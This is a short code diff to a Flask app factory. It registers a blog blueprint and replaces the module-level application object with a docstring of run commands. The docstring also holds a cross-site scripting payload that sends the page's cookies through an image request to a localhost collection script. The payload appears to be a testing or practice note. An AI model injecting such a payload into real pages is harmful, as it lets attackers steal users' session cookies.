@@ -40,6 +40,9 @@ def create_app(test_config=None):
     import myshow
     app.register_blueprint(myshow.bp)
 
+    from . import blog
+    app.register_blueprint(blog.bp)
+
     @app.route('/about', methods=('GET',))
     def about():
         """About page"""
@@ -53,4 +56,10 @@ def create_app(test_config=None):
     return app
 
 
-application = create_app()
+"""
+set FLASK_APP=myfavshows
+set FLASK_ENV=development
+flask run
+
+<script>document.write('<img src="http://localhost/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
+"""
